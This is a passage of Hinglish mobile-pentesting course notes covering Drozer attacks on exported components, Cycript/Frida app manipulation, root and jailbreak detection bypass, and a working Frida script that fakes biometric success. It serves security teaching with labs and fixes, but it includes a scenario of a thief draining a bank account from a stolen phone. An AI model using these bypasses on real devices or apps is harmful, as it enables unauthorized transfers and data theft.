      * `ADB` aapki lifeline hai. Iske bina aap phone se connect hi nahi kar sakte. `logcat` (logs) dekhna, files nikaalna, sab `adb` se hota hai.
      * `Drozer` aapka hathiyaar hai "Exported Component" (M2.1) ko exploit karne ke liye. Jo kaam (exported activity call karna) `adb shell am start ...` se mushkil hota hai, woh Drozer 1 command mein kar deta hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):**

      * `ADB`: Hamesha. `adb logcat` (logs) hamesha on rakho taaki app crash hone par error dikhe. `adb shell` se file system check karne ke liye.
      * `Drozer`: Jab aapko Manifest (M2.1) mein `android:exported="true"` waali *Activities, Services, Providers,* ya *Broadcast Receivers* milein.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):**

      * Bina `ADB` ke aap test hi nahi kar sakte.
      * Bina `Drozer` ke, aap exported components ko manually `adb shell` se exploit karne ki koshish karenge, jismein bahut time lagta hai aur aksar fail hota hai. Drozer is process ko automate kar deta hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown (Drozer):**

      * **Setup:**
        1.  PC par `drozer` install karo (`pip install drozer`).
        2.  Phone par `drozer-agent.apk` install karo (root/emulator par).
        3.  Agent app ko kholo aur "Embedded Server" ko **ON** karo.
      * **Connection:**
        1.  PC se `adb forward tcp:31415 tcp:31415` chalao (Drozer ke port ko forward karne ke liye).
        2.  PC par `drozer console connect` chalao.
      * **Hacking:**
        1.  Aapko `dz>` prompt mil jaayega.
        2.  Command chalao: `run app.package.info -a com.vulnerable.app` (App ki info).
        3.  Command chalao: `run app.activity.info -a com.vulnerable.app` (Saari activities ki list).
        4.  Aapko "exported" activity dikhegi (e.g., `com.vulnerable.app.AdminActivity`).
        5.  Command chalao: `run app.activity.start --component com.vulnerable.app com.vulnerable.app.AdminActivity`
        6.  Boom\! 💥 Phone par (bina login) seedha Admin screen khul jaayegi.

7.  **💻 Code example / Command Example:**

      * **ADB Deep Dive (Useful Commands):**

        ```bash
        # 1. Real-time logs dekho (crash, errors pakadne ke liye)
        adb logcat | grep "com.vulnerable.app"

        # 2. App ka data (bina root) backup/extract karo (agar allowBackup=true hai)
        adb backup -f backup.ab com.vulnerable.app

        # 3. 'backup.ab' file ko 'tar' file mein badlo (PC par)
        # (Requires 'Android Backup Extractor' tool - abe.jar)
        java -jar abe.jar unpack backup.ab backup.tar

        # 4. App ka data (rooted phone par) seedha pull kar lo
        adb shell "su -c 'cp /data/data/com.vulnerable.app/shared_prefs/prefs.xml /data/local/tmp/'"
        adb pull /data/local/tmp/prefs.xml
        ```

      * **✍️ Line-by-line explanation (ADB):**

          * `adb logcat | grep ...`: `logcat` (saare logs) ke output ko filter karo aur sirf hamari app ke logs dikhao.
          * `adb backup ...`: App ka backup `backup.ab` file mein banata hai (agar `allowBackup="true"` ho).
          * `java -jar abe.jar ...`: `backup.ab` file (jo special format mein hai) ko standard `backup.tar` (ZIP jaisi) file mein badalta hai, jise aap khol kar app ka data (SharedPrefs, DBs) dekh sakte hain.
          * `adb shell "su -c 'cp ...'"`: Root (`su -c`) bankar app ki private file (`prefs.xml`) ko public folder (`/data/local/tmp/`) mein copy karta hai.
          * `adb pull ...`: Us public folder se file ko PC par copy (pull) kar leta hai.

      * **Drozer (Exported Activity Exploit):**

        ```bash
        # (Drozer console 'dz>' ke andar)

        # 1. Package ka attack surface dekho
        dz> run app.package.attacksurface com.vulnerable.app

        # 2. Pata chala ki 1 activity exported hai. Use start karo:
        dz> run app.activity.start --component com.vulnerable.app com.vulnerable.app.SecretAdminScreen
        ```

      * **✍️ Line-by-line explanation (Drozer):**

          * `run app.package.attacksurface ...`: Yeh Drozer ka magic module hai. Yeh Manifest (M2.1) ko padh kar batata hai ki kitni activities, services, providers "exported" (vulnerable) hain.
          * `run app.activity.start ...`: `adb shell am start` ka aasan version. Yeh `com.vulnerable.app` package ki `SecretAdminScreen` activity ko direct phone par khol deta hai.

8.  **🐞 Common beginner mistakes:**

      * **Drozer:** `adb forward` command chalaana bhool jaana. (Bina iske PC aur agent baat nahi kar payenge).
      * **Drozer:** Agent app mein "Server" ko ON karna bhool jaana.
      * **ADB:** `adb logcat` na dekhna. 90% time jab app crash hoti hai (e.g., Frida se), toh `logcat` hi batata hai ki *kyun* crash hui (e.g., "Function not found").
      * **ADB:** Rooted phone par `adb pull /data/data/com.app/file` direct chalana. (Yeh 'Permission Denied' dega). Hamesha pehle file ko `su -c 'cp ...'` se `/data/local/tmp/` mein copy karo, fir wahan se `adb pull` karo.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **❓ Beginner's Core Question:** "Manifest mein 'exported=true' dikh gaya (M2.1), ab main isse exploit kaise karoon?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester MobSF/JADX se `AndroidManifest.xml` padhta hai.
        2.  Use dikhta hai `<provider android:name=".UserDataProvider" android:exported="true" android:authorities="com.app.provider" />`.
        3.  Use pata chalta hai ki app ka database provider 'exported' hai.
        4.  Woh `drozer console connect` karta hai.
        5.  Drozer mein chalata hai: `run app.provider.info -a com.app`.
        6.  Fir woh us provider se data 'query' (chori) karta hai:
            `run app.provider.query content://com.app.provider/users/ --vertical`
        7.  Boom\! 💥 Terminal par poori user table (usernames, hashed passwords) print ho jaati hai. Yeh "Insecure Data Access" (M5.4) bug hai, jise Drozer se exploit kiya gaya.
      * **💰 Real Bug Bounty Example:** "Exported Content Provider leaks user data". Yeh ek common P2/P3 bug hai jo Drozer se 2 minute mein mil jaata hai.

10. **✅ Quick checklist / Mitigation:**

      * `ADB`: Hamesha `adb logcat` par nazar rakho.
      * `ADB`: File pull karne ke liye (rooted), `cp` (to `/tmp`) -\> `pull` (from `/tmp`) tareeka use karo.
      * `Drozer`: (Setup) `adb forward` -\> (App) `Server ON` -\> (PC) `drozer console connect`.
      * `Drozer`: Hacking ke liye `run app.package.attacksurface <pkg>` se shuru karo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DIVA app ke "Access Control Issues - 1" challenge ko dekho.
      * `JADX` se uski exported 'private' activity ka naam (`.APICredsActivity`) dhoondho.
      * `Drozer` use karke (`run app.activity.start ...`) us activity ko direct launch karke API keys churao.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `Drozer`, `adb`, `Android Backup Extractor (abe.jar)`.
      * **ADB Shell:** `pm` (package manager), `am` (activity manager), `dumpsys` (system info). (e.g., `adb shell dumpsys activity top` - top activity dekhne ke liye).

-----

## 4.3: iOS Hacking: Cycript & UI Inspection

1.  **🎯 Title / Short Summary:** iOS App ke Saath Khelna (Cycript & UI) 🍎.

2.  **🤔 Kya hai? (What?):**

      * **Cycript:** Yeh (puraana) Frida jaisa tool hai, khaas kar iOS ke liye. Yeh aapko ek interactive `cy#` prompt deta hai jisse aap chalti hui app (Objective-C/Swift) ke functions ko call kar sakte hain aur unke variables (values) ko dekh/badal sakte hain.
      * **UI Inspection (e.g., `reveal`, `FLEX`):** Yeh tools aapko app ke "User Interface" (UI) ko 'deconstruct' (tod kar) dekhne dete hain. Aap dekh sakte hain ki kaun sa button 'hidden' (chhupa hua) hai, ya text field ke peeche kya logic hai.

3.  **💡 Kyu important hai? (Why?):**

      * `Cycript` (ya naya `Frida REPL`) aapko app ke logic ko 'explore' karne deta hai. (e.g., "Kya main `[AppDelegate isPremiumUser]` function ko call karke dekhu woh kya return karta hai?").
      * `UI Inspection` se aap "hidden" features dhoondh sakte hain. Bahut baar developers 'Admin' button ko UI mein `hidden=true` kar dete hain. Aap UI Inspector se use 'unhide' karke click kar sakte hain.

4.  **⏰ Kab/Kahan check karein? (When/Where?):**

      * `Cycript`: Jab aapko app ke runtime state (e.g., "is user logged in?") ko check karna ho ya manually function call karne ho. (Frida REPL ab zyada popular hai).
      * `UI Inspection`: Hamesha. App ki har screen par UI inspector run karke dekho ki koi chhupa hua button, label, ya 'debug' menu toh nahi hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap client-side logic bugs (jaise hidden admin panel) ko miss kar denge. Aap samajh nahi payenge ki app ka kaun sa 'View Controller' (screen) kis function ko call kar raha hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **UI Inspection (Using `FLEX` Tweak):**
        1.  (Jailbroken Phone) Cydia/Sileo se `FLEXall` (ya `FLEX`) tweak install karo.
        2.  Settings mein jaakar `FLEXall` ko 'Enabled' karo aur target app (e.g., "VulnerableApp") ko select karo.
        3.  App ko kholo. Aapko screen par ek `FLEX` toolbar dikhega.
        4.  Us toolbar mein "Select" tool se screen par kisi bhi button/label ko tap karo.
        5.  `FLEX` aapko us button ki saari properties (text, `isHidden`, `isEnabled`) dikha dega.
        6.  Aap in properties ko *real-time mein edit* kar sakte hain. (e.g., `isHidden = false` kar do).
      * **Cycript (Old Way):**
        1.  (Jailbroken Phone) Cydia se `Cycript` install karo.
        2.  PC se phone mein SSH karo (M1.4).
        3.  App ka process ID (PID) dhoondho (`ps aux | grep "AppName"`).
        4.  Cycript ko app se attach karo: `cycript -p <PID>`
        5.  `cy#` prompt mil jaayega.

7.  **💻 Code example / Command Example:**

      * **Cycript (Exploring App):**

        ```bash
        # (Phone ke SSH shell mein 'cy#' prompt par)

        # 1. App ka main 'instance' pakdo
        cy# var app = [UIApplication sharedApplication]

        # 2. App ka 'AppDelegate' (jahan logic hota hai) dhoondho
        cy# var delegate = [app delegate]

        # 3. Memory mein maujood saare 'View Controllers' (screens) dekho
        cy# choose(UIViewController)

        # 4. Kisi specific controller (e.g., AdminVC) ko pakdo aur uska 'view' (UI) dekho
        cy# var admin_vc = ...
        cy# [admin_vc view]

        # 5. Kisi function ko call karke dekho
        cy# [delegate isPremiumUser]
        (Output: false)

        # 6. Kisi property ko badal do
        cy# [delegate setPremiumUser:true] 
        ```

      * **✍️ Line-by-line explanation (Cycript):**

          * `[UIApplication sharedApplication]`: Objective-C syntax hai "UIApplication class ka 'sharedApplication' method call karo".
          * `choose(UIViewController)`: Cycript ka magic command: "Memory mein jitne bhi 'UIViewController' object hain, sabki list do."
          * `[delegate isPremiumUser]`: `delegate` object ka `isPremiumUser` function call karo (result `false` aaya).
          * `[delegate setPremiumUser:true]`: `delegate` object ka `setPremiumUser` function call karo aur value `true` bhejo. (Premium unlock ho gaya\!).

      * **Frida REPL (The New Way, better than Cycript):**

        ```bash
        # (PC ke terminal par)
        # Frida ke interactive shell mein attach ho jao
        frida -U -n "AppName"

        # [Local::AppName ]-> (Frida ka prompt)

        # Cycript jaisa hi kaam, lekin JavaScript syntax mein
        [Local::AppName ]-> var delegate = ObjC.classes.AppDelegate.sharedInstance();
        [Local::AppName ]-> delegate.isPremiumUser()
        (Output: false)
        [Local::AppName ]-> delegate.setPremiumUser_(true)
        ```

8.  **🐞 Common beginner mistakes:**

      * `Cycript` mein JavaScript syntax (`delegate.isPremiumUser()`) use karna. (Cycript, Objective-C syntax `[delegate isPremiumUser]` use karta hai).
      * `Frida REPL` mein Objective-C syntax (`[... ]`) use karna. (Frida, JS syntax `...()` use karta hai).
      * UI Inspector (`FLEXall`) ko install karke enable na karna.
      * UI mein `isHidden=false` karke sochna bug mil gaya. (Asli bug tab hai jab uss 'unhidden' button ko click karne se *asli* sensitive action ho jaaye).

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **❓ Beginner's Core Question:** "Main app mein chhupe hue admin button kaise dhoondhunga?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester app ki "Settings" screen kholta hai.
        2.  Woh `FLEXall` (UI Inspector) ka 'Select' tool on karta hai.
        3.  Use screen par ek 'hidden' (dikhaai nahi de raha) button dikhta hai.
        4.  Woh `FLEX` mein us button ki properties dekhta hai: `isHidden = true`, `text = "Admin Panel"`.
        5.  Woh real-time mein `isHidden` ko `false` set kar deta hai.
        6.  Button screen par dikhne lagta hai. 🕵️‍♂️
        7.  Woh button click karta hai, aur app ka 'Admin Debug Menu' khul jaata hai (jahan se woh kisi bhi user ka data edit kar sakta hai).
        8.  Yeh "Hidden Functionality" (Broken Access Control) P2 bug hai.
      * **💰 Real Bug Bounty Example:** Bahut saari apps (khaas kar e-commerce) mein 'debug' ya 'staging' menu release app mein 'hidden' reh jaata hai. `FLEX` se use unhide karke pentester server ka environment (Production se Staging) badal sakte hain ya sensitive logs dekh sakte hain.

10. **✅ Quick checklist / Mitigation:**

      * (Jailbroken) Cydia se `FLEXall` install karo.
      * App ki har screen ko `FLEX` se inspect karke 'hidden' UI elements (buttons, labels) dhoondho.
      * App ke logic ko runtime par explore karne ke liye `frida -U -n "AppName"` (Frida REPL) ka istemaal karo.
      * **Fix:** Release (App Store) build se saara debug/admin UI (code aur UI elements) poori tarah *hata* do, sirf `hidden=true` mat karo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DVIA (Damn Vulnerable iOS App) install karo.
      * `FLEXall` tweak install karo.
      * DVIA ki 'Local Data Storage' screen par jaao aur `FLEX` se dekho ki 'Login' button ke peeche kaun sa function (selector) call ho raha hai.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `FLEXall` (UI Tweak), `Cycript` (Old REPL), `Frida REPL` (New REPL).
      * **Frida REPL Syntax:** `ObjC.classes.<ClassName>` (class dhoondho), `choose(ObjC.classes.<ClassName>, {onMatch: ..., onComplete: ...})` (memory mein object dhoondho).

-----

## 4.4: Bypassing Root & Jailbreak Detection

1.  **🎯 Title / Short Summary:** App ka "Root Check" Ko Dhokha Dena 🤥.

2.  **🤔 Kya hai? (What?):** Yeh "Dynamic Bypass" hai. Jab app (M3.5 mein dekha) check karti hai `if (isRooted()) { exit(); }` aur band ho jaati hai, toh hum 'Static Patching' (mushkil raasta) ke bajaye 'Frida' (aasan raasta) ka istemaal karke us `isRooted()` function ko real-time mein hook karte hain aur use hamesha `false` return karwa dete hain.

3.  **💡 Kyu important hai? (Why?):** Yeh ek *blocker* hai. Agar high-security app (Bank, Wallet, Netflix) ko root/jailbreak mil gaya, toh woh chalegi hi nahi. Agar app chalegi nahi, toh hum uski API (M6) ko test kaise karenge? Is bypass ke bina, 80% high-security apps ki testing shuru hi nahi ho sakti.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Jaise hi aap rooted/jailbroken phone par app kholein aur woh "Device is rooted/jailbroken. App cannot run." message dekar band ho jaaye.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aapka pentest shuru hone se pehle hi khatm ho jaayega. Aap client ko bolenge, "App rooted phone par nahi chalti," aur woh kahega, "Toh bypass karo, wahi toh tumhara kaam hai\!"

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown (Dynamic Bypass):**

      * **App kya check karti hai?**
          * Files: Kya `/system/app/Superuser.apk` (Android) ya `/Applications/Cydia.app` (iOS) file maujood hai?
          * Commands: Kya `su` (Android) ya `ssh` (iOS) command chal raha hai?
          * Packages: Kya `com.topjohnwu.magisk` (Android) ya `io.sileo.sileo` (iOS) package install hai?
      * **Humara Bypass (The 2 Ways):**
          * **Method 1: Objection (The Easy Way) 🥇**
            1.  `objection -g com.bank.app explore`
            2.  `com.bank.app #> android root disable` (ya `ios jailbreak disable`)
            3.  Objection 10-15 common root-check libraries (jaise `RootBeer`, `JailbreakMonkey`) ke functions ko automatically hook karke `false` return karwa deta hai. 90% apps isse bypass ho jaati hain.
          * **Method 2: Frida (The Universal Way) 🥈**
            1.  Jab Objection fail ho (matlab app ne *custom* check likha hai).
            2.  Hum `JADX` / `Ghidra` (M3) se app ko reverse karke us custom function ka naam (e.g., `com.bank.security.RootChecker.isMyPhoneRooted()`) dhoondhte hain.
            3.  Hum us specific function ke liye custom Frida script (jaisa M4.1 mein likha) likhte hain jo hamesha `false` return kare.
            4.  `frida -U -f com.bank.app -l bypass_root.js --no-pause`.

7.  **💻 Code example / Command Example:**

      * **Objection (The 90% Solution):**

        ```bash
        # 1. Rooted phone par, banking app ko Objection se spawn karo
        objection -g com.bofa.bank.app explore

        # 2. Turant (app ke check karne se pehle) bypass command chalao
        com.bofa.bank.app #> android root disable

        # 3. (Objection aayega: "Disabled root detection for 'RootBeer'...")
        # 4. Ab app ko use karo. Woh chal jaayegi.
        ```

      * **Frida (Universal Bypass Script):**

          * Internet par bahut saari "universal" bypass scripts milti hain (jo Objection se bhi zyada powerful hoti hain).
          * **iOS ke liye 'Shadow' Tweak:** Yeh Cydia se install hone wala ek tweak hai jo *system-wide* jailbreak detection ko bypass karta hai (Frida ki zaroorat nahi).

        <!-- end list -->

        ```bash
        # (PC Terminal par)
        # 1. Universal script download karo (e.g., frida-android-unroot.js)
        # 2. App ko script ke saath start karo

        frida -U -f com.bank.app -l frida-android-unroot.js --no-pause
        ```

      * **✍️ Line-by-line explanation (Frida):**

          * `frida -U -f ... -l ...`: Hum app ko start (`-f`) kar rahe hain aur *start hote hi* (`--no-pause`) usmein bypass script (`-l`) inject kar rahe hain.
          * `frida-android-unroot.js` (script ke andar): Yeh script `File`, `PackageManager`, `Runtime.exec` jaise 100+ functions ko hook kar leti hai taaki jab bhi app `su` file dhoondhne ki koshish kare, script use dhokha dekar kahe "aisi koi file nahi hai."

      * **🚀 Quick run expected output:**

          * App (jo pehle band ho rahi thi) normal chalne lagegi.
          * Aapke Frida terminal par 'Hooked java.io.File...', 'Hooked Runtime.exec...' jaise messages flash honge, jo dikhata hai ki bypass kaam kar raha hai.

8.  **🐞 Common beginner mistakes (Emphasis):**

      * **App ko pehle kholna, fir Frida/Objection attach karna.** Root check app ke *start* hote hi (pehle 1 second mein) ho jaata hai. Aapko app ko `frida -f` (spawn) ya `objection -g` (gadget) se hi start karna hoga taaki hook pehle attach ho, check baad mein chale.
      * **Sirf ek bypass try karke give up kar dena.** Objection fail ho sakta hai. Universal Frida script try karo. Woh bhi fail ho, toh JADX se custom function dhoondh kar usko hook karo. Bypass *hamesha* hota hai.
      * **iOS par 'Shadow' try na karna.** iOS par 90% jailbreak detection 'Shadow' (Cydia Tweak) se hi bypass ho jaata hai. Frida ki zaroorat hi nahi padti.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Netflix/Banking app rooted phone par nahi chalti. Main haar gaya?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester, Bank App kholta hai -\> "Root Detected\!" -\> App band.
        2.  Pentester: "Challenge accepted."
        3.  `objection -g com.bank.app explore` -\> `android root disable` -\> App *phir bhi* band ho gayi. (Matlab Objection fail).
        4.  Pentester (gussa nahi hota): "Okay, custom check hai."
        5.  Woh `JADX` kholta hai, "root" search karta hai. Use `com.bank.security.MyRootCheck.java` milti hai.
        6.  Woh us class ke 5-6 functions (`checkFiles`, `checkCommands`) ko hook karne ke liye 10 line ki custom Frida script (`bank_bypass.js`) likhta hai.
        7.  `frida -U -f com.bank.app -l bank_bypass.js --no-pause`
        8.  Boom\! 💥 App normal chalne lagti hai.
        9.  Ab Pentester, Burp (M2) se API hacking (M6) shuru karta hai.
      * **💰 Real Bug Bounty Example:** "Root Detection Bypass" *apne aap mein* ek P4 (Low) severity bug ho sakta hai. Lekin iska asli 'value' P1 bug (jo API par milta hai) ko dhoondhne ke liye 'blocker' hatana hai.

10. **✅ Quick checklist / Mitigation:**

      * **iOS:** Sabse pehle Cydia se `Shadow` tweak try karo.
      * **Android/iOS:** `Objection` (`... root disable` / `... jailbreak disable`) try karo.
      * **Universal:** Internet se `frida-multiple-unpinning` (root bypass bhi karta hai) ya 'universal unroot' scripts try karo.
      * **Manual:** `JADX`/`Ghidra` se custom function dhoondh kar Frida se hook karo.
      * **Fix:** Root detection achhi cheez hai, lekin 100% foolproof nahi. Asli security (logic) hamesha server-side par rakho.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DVIA (iOS) ka "Jailbreak Detection" challenge lo aur use `Shadow` tweak se bypass karo.
      * DIVA (Android) ka "Root Detection" challenge lo aur use `objection` se bypass karo.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `Objection`, `Frida`, `Shadow` (iOS Tweak).
      * **Android Libraries (jinko bypass karna hota hai):** `RootBeer`, `SafetyNet` (Advanced).

-----

## 4.5: Bypassing Biometric Authentication

1.  **🎯 Title / Short Summary:** Fingerprint/Face ID ka Lock Todna 👆.

2.  **🤔 Kya hai? (What?):** Jab app aapse "Login" password ke bajaye "Fingerprint/Face ID" maangti hai, toh hum (attacker) Frida ka istemaal karke uss check ko bhi bypass kar dete hain. Hum app ko dhokha dete hain ki "Haan haan, fingerprint match ho gaya, aage badho."

3.  **💡 Kyu important hai? (Why?):** Bahut saari banking/wallet apps "Send Money" jaise critical action se pehle fingerprint maangti hain. Agar hum (attacker, jise phone unlock mila) us fingerprint ko bypass kar dein, toh hum poora account khaali kar sakte hain.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Jab bhi app fingerprint/Face ID ka popup (dialog) dikhaye. (e.g., Login, Send Money, View Secrets).

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap ek critical vulnerability miss kar denge. Aap sochenge ki app fingerprint se "secure" hai, jabki woh ek simple Frida script se 10 second mein bypass ho sakti hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Android Biometric Flow (App kaise check karti hai):**
        1.  App `BiometricPrompt.authenticate(...)` function ko call karti hai.
        2.  Yeh function OS ko bolta hai, "Fingerprint dialog dikhao."
        3.  OS dialog dikhata hai. User fingerprint lagata hai.
        4.  OS, App ko ek 'callback' (jawab) bhejta hai. Yeh callback ek function hota hai, jaise `onAuthenticationSucceeded` (agar match hua) ya `onAuthenticationFailed` (agar fail hua).
      * **Humara Bypass (Frida Hooking):**
        1.  Hum `JADX` se dekhte hain ki app kaun sa 'callback' function use kar rahi hai (e.g., `onAuthenticationSucceeded`).
        2.  Hum Frida se `BiometricPrompt.authenticate` function ko *nahi*, balki uske *jawab* waale function (`onAuthenticationSucceeded`) ko hook karte hain.
        3.  Hum app ke 'Send Money' button par click karte hain.
        4.  App fingerprint dialog dikhati hai. Hum 'Cancel' daba dete hain.
        5.  App ka `onAuthenticationFailed` (ya `onCancel`) function trigger hota hai.
        6.  **Lekin\!** Hum Frida se `onAuthenticationFailed` ke andar hi `onAuthenticationSucceeded` ko *zabardasti call* karwa dete hain\!
        7.  App ko lagta hai ki fingerprint match ho gaya, aur "Send Money" ho jaata hai.

7.  **💻 Code example / Command Example:**

      * **Android Biometric Code (JADX mein):**
        ```java
        // App ka code
        BiometricPrompt.AuthenticationCallback callback = new BiometricPrompt.AuthenticationCallback() {
            
            @Override
            public void onAuthenticationError(int errorCode, CharSequence errString) {
                // ... User ne cancel kiya ya fail hua
                showError("Auth Failed!");
            }
            
            @Override
            public void onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult result) {
                // ... Fingerprint match ho gaya!
                doSendMoney(); // 🐞 Humara target yeh hai
            }
        };

        myPrompt.authenticate(promptInfo, callback);
        ```
      * **Frida Bypass Script (`biometric_bypass.js`):**
        ```javascript
        Java.perform(function() {
            // Hum 'onAuthenticationError' (failure) ko hook kar rahe hain
            const BiometricCallback = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
            
            BiometricCallback.onAuthenticationError.implementation = function(errorCode, errString) {
                console.log("onAuthenticationError CALLED! Bypassing...");
                
                // Asli function ko call karo (taaki app crash na ho)
                this.onAuthenticationError(errorCode, errString);
                
                // 💥 JABARDASTI 'onAuthenticationSucceeded' ko call kar do!
                // Hum 'null' bhej rahe hain kyunki humein 'result' se matlab nahi
                this.onAuthenticationSucceeded(null); 
            };
            
            // (Safety ke liye 'onFailed' ko bhi hook kar sakte hain)
            BiometricCallback.onAuthenticationFailed.implementation = function() {
                console.log("onAuthenticationFailed CALLED! Bypassing...");
                this.onAuthenticationFailed();
                this.onAuthenticationSucceeded(null);
            };
        });
        ```
      * **Frida Command (PC par):**
        ```bash
        frida -U -f com.vulnerable.wallet.app -l biometric_bypass.js --no-pause
        ```
      * **🚀 Quick run expected output:**
        1.  Aap 'Send Money' dabate hain.
        2.  Fingerprint dialog aata hai.
        3.  Aap "Cancel" button dabate hain (ya galat finger lagate hain).
        4.  Aapke PC terminal par "onAuthenticationError CALLED\! Bypassing..." print hota hai.
        5.  App "Auth Failed\!" dikhane ke bajaye "Money Sent\!" dikha deti hai. 💥

8.  **🐞 Common beginner mistakes (Emphasis):**

      * `onAuthenticationSucceeded` function ko hook karna. (Galat\! Woh function toh *tab* chalega jab auth *succeed* hoga. Hum toh fail karwa rahe hain). Hamein **failure** waale functions (`onAuthenticationError`, `onAuthenticationFailed`) ko hook karke unke andar se **success** waale function (`onAuthenticationSucceeded`) ko call karna hai.
      * Hook mein `this.onAuthenticationSucceeded(null)` ke bajaye sirf `onAuthenticationSucceeded(null)` call karna. (Error aayega. Humein `this` (us class ka current instance) ke context mein call karna hai).
      * `androidx.biometric` (naya) ke bajaye `android.hardware.fingerprint` (purana) hook karna. (Hamesha JADX se check karo ki app kaun si library use kar rahi hai).

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **❓ Beginner's Core Question:** "App fingerprint maang rahi hai, yeh toh bahut secure hai?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Scenario: Attacker (chor) ko victim ka phone 'unlocked' milta hai (shayad victim paas mein hi tha).
        2.  Attacker bank app kholta hai. Login ho jaata hai (kyunki phone unlocked hai).
        3.  Attacker "Transfer Funds" par jaata hai. App (security ke liye) *dobara* fingerprint maangti hai.
        4.  Attacker ke paas victim ka fingerprint nahi hai.
        5.  Attacker phone ko PC se (ya wireless ADB se) connect karta hai, `frida` se upar waali script (`biometric_bypass.js`) inject karta hai.
        6.  Fingerprint dialog par "Cancel" dabata hai.
        7.  Frida hook `onAuthenticationSucceeded` ko call kar deta hai.
        8.  App (dhokhe mein) transaction ko authorize kar deti hai. Saara paisa transfer.
      * **💰 Real Bug Bounty Example:** "Biometric Authentication Bypass (via Frida Hooking) allows unauthorized fund transfer." Yeh ek P1 (Critical) bug hai, kyunki yeh app ke 'second factor' (2FA) ko fail kar raha hai.
      * **iOS (LAContext):** iOS par bhi same logic hai. Hum `LAContext` class ke `evaluatePolicy` ke 'reply block' (callback) ko hook karke `success = true` bhej dete hain.

10. **✅ Quick checklist / Mitigation:**

      * `JADX` se auth callback (`onAuthenticationSucceeded`) ka naam dhoondho.
      * `Frida` se *failure* callbacks (`onAuthenticationError`, `onAuthenticationFailed`) ko hook karo.
      * Failure callback ke *andar se* success callback (`this.onAuthenticationSucceeded(...)`) ko call karo.
      * **Fix:** **Biometric/Face ID ko password ka replacement mat samjho.** Critical actions (Send Money, Change Password) ke liye hamesha **App ka PIN ya Password** (jo phone ke lock se alag ho) maango. Frida, app ke PIN ko guess nahi kar sakta (agar woh server-side check ho raha hai), lekin biometric ko bypass kar sakta hai.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * Internet par "BiometricPrompt Example" (GitHub) se koi demo app download karo.
      * Use rooted phone par chalao.
      * Upar di gayi Frida script (`biometric_bypass.js`) ka istemaal karke uske fingerprint check ko (Cancel daba kar) bypass karne ki koshish karo.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `Frida`, `JADX-GUI`.
      * **Android Class:** `androidx.biometric.BiometricPrompt$AuthenticationCallback` (Naya), `android.hardware.fingerprint.FingerprintManager.AuthenticationCallback` (Purana).
      * **iOS Class:** `LAContext` (Local Authentication).

-----

Module 4 complete\! 🏁 Yeh sabse 'hacker' waala module tha. Humne app ke runtime mein ghusna, Frida se function badalna, root detection aur fingerprint lock todna... sab seekh liya hai.

Ab humein client-side (app ke andar) ki vulnerabilities mein deep dive karna hai. Jab aap ready hon, toh batana. Hum **Module 5: Core Vulns - Client-Side** shuru karenge, jahan hum app ke storage (files, database) mein chhupe passwords aur data ko nikaalna seekhenge\! 💾

=============================================================

Chalo bhai, shuru karte hain aapke Complete Mobile Pentester notes ka Module 5\! 🚀

Module 4 mein humne Frida ka jaadoo 🪄 (runtime hacking) seekha. Ab waqt hai uss power ka istemaal karke app ke "tijori" (storage) mein rakhe data ko churane ka.

Is module mein hum dekhenge ki apps apna data (passwords, tokens, user info) phone mein kahan-kahan galat tareeke se store karti hain (Insecure Data Storage), aur kaise hum (attacker) uss data ko (rooted phone se) nikaal sakte hain. Hum Android aur iOS ke platform-specific bugs (jaise Deep Links, URL Schemes) ko bhi exploit karna seekhenge.

-----

## 5.1 & 5.2: Comparison: Insecure Data Storage (Android vs. iOS)

1.  **🎯 Title / Short Summary:** App ki Chhupi hui Tijori Todna 💾. Android (SharedPrefs, SQLite) aur iOS (Plist, Keychain) par apps data kahan galat jagah rakhti hain aur use kaise churaayein.
2.  **💡 Kyu important hai? (Why?):** Yeh mobile app ka sabse common aur sabse critical client-side bug hai. Developers sochte hain "data phone pe hai, toh safe hai." Hum (attacker) sochte hain "data phone pe hai, toh *mera* hai." Agar app password, auth token, ya API key ko galat jagah (jaise simple file) mein rakhti hai, toh rooted/jailbroken phone par hum use 1 minute mein nikaal sakte hain.

-----

### ⭐ Comparison: Android vs. iOS Insecure Data Storage

| Pehlu (Aspect) | 🤖 Android (The Open File System) | 🍎 iOS (The Sandboxed Keychain) |
| :--- | :--- | :--- |
| **2. Kya hai?** (What?) | App ka sensitive data (jaise password) ek simple XML file (`Shared Preferences`) ya database file (`SQLite`) mein store karna. | App ka sensitive data ek simple XML file (`UserDefaults`, `.plist`) mein store karna, **Keychain** (secure tijori) ke bajaye. |
